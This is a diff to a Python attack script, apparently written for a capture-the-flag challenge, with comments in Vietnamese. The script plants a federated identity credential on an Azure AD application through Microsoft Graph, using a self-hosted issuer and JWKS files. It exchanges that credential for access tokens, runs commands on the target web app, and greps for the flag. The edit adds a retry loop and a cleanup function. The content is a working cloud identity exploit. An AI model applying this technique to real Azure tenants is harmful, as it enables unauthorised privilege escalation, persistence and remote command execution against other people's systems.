@@ -93,9 +93,22 @@ def exchange(app,scope):
 r=api(f"https://graph.microsoft.com/v1.0/applications/{rsvc_oid}/federatedIdentityCredentials","POST",
       body={"name":"ver-"+pfx[:12],"issuer":ISS,"subject":subject,"audiences":["api://AzureADTokenExchange"]})
 FID=r.get("id") if "error" not in r else None
-print("[*] FIC:",("ok" if FID else r)); time.sleep(45)
+print("[*] FIC:",("ok" if FID else r))
 
-am=exchange(rsvc,B+"/.default")
+def cleanup():
+    if FID: api(f"https://graph.microsoft.com/v1.0/applications/{rsvc_oid}/federatedIdentityCredentials/{FID}","DELETE")
+    for p in (f"{pfx}/jwks.json",f"{pfx}/.well-known/jwks.json",f"{pfx}/.well-known/openid-configuration"):
+        try: web.delete_blob(p)
+        except Exception: pass
+
+am=""
+for i in range(10):
+    time.sleep(15)
+    am=exchange(rsvc,B+"/.default")
+    if am: print("[*] exchange OK vòng",i+1); break
+    print("   chờ FIC propagate... vòng",i+1)
+if not am:
+    print("[!] không đổi được token sau 150s"); cleanup(); raise SystemExit
 SITEBASE=f"{B}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{site}"
 MIBASE=f"{B}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.ManagedIdentity/userAssignedIdentities/{mi}"
 
@@ -165,10 +178,6 @@ else:
     print("=== grep flag trong wwwroot ===")
     print(run("grep -rIoE 'DF26[{][^}]*[}]' /home/site/wwwroot /home 2>/dev/null | head")[:400])
 
-# dọn dẹp
-if FID: api(f"https://graph.microsoft.com/v1.0/applications/{rsvc_oid}/federatedIdentityCredentials/{FID}","DELETE")
-for p in (f"{pfx}/jwks.json",f"{pfx}/.well-known/jwks.json",f"{pfx}/.well-known/openid-configuration"):
-    try: web.delete_blob(p)
-    except Exception: pass
+cleanup()
 PY
 echo "================ DONE ================"
